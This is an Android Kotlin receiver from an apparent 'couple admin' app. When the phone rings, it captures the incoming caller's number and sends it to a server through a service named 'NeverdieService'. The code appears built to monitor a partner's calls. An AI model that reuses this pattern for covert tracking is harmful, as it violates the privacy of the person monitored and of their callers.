package io.defy.www.coupleadmin.receiver

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.telephony.PhoneNumberUtils
import android.telephony.TelephonyManager
import android.util.Log
import io.defy.www.coupleadmin.service.NeverdieService


class PhoneReceiver : BroadcastReceiver() {

    val TAG = "PHONE STATE"
    private var mLastState: String? = null

    override fun onReceive(context: Context, intent: Intent) {
        val state = intent.getStringExtra(TelephonyManager.EXTRA_STATE)
        Log.e(TAG, state)

        if (state == mLastState) {
            return

        } else {
            mLastState = state

        }

        if (TelephonyManager.EXTRA_STATE_RINGING == state) {
            val incomingNumber = intent.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER)
            val phoneNumber = PhoneNumberUtils.formatNumber(incomingNumber)

            NeverdieService.nowPhoneCallToServer(phoneNumber)
        }
    }

}